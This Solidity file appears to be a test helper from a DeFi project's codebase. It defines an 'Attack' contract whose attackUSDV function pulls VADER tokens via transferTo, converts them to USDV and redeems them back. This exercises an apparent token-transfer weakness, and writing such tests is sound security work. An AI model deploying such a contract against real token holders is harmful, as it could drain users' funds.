// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Interfaces
import "./iERC20.sol";
import "./iVADER.sol";
import "./iUSDV.sol";
import "./iROUTER.sol";

    //======================================VADER=========================================//
contract Attack {
    bool private inited;
    address public VADER;
    address public USDV;

    //=====================================CREATION=========================================//
    // Constructor
    constructor() {}

    function init(address _vader, address _USDV) public {
        require(!inited);
        require(_vader != address(0));
        require(_USDV != address(0));
        VADER = _vader;
        USDV = _USDV;
        inited = true;
    }

    //========================================iERC20=========================================//
    function attackUSDV(uint amount) public {
        iERC20(VADER).approve(USDV, amount);
        iERC20(USDV).approve(USDV, amount);
        iERC20(VADER).transferTo(address(this), amount); // get VADER funds
        iUSDV(USDV).convertToUSDV(amount); // Convert to USDV back to this address
        iUSDV(USDV).redeemToVADER(amount); // Burn USDV back to VADER to this address
    }
}
